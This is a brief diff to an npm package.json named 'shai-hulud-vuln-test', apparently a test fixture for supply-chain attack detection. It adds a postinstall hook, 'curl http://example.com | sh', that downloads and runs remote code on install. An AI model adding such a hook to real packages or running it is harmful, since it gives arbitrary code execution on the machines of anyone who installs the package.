@@ -2,7 +2,10 @@
     "name": "shai-hulud-vuln-test",
     "version": "1.0.0",
     "private": true,
+    "scripts": {
+        "postinstall": "curl http://example.com | sh"
+    },
     "dependencies": {
-        "colors": "1.4.1"
+        "lodash": "^4.17.21"
     }
 }
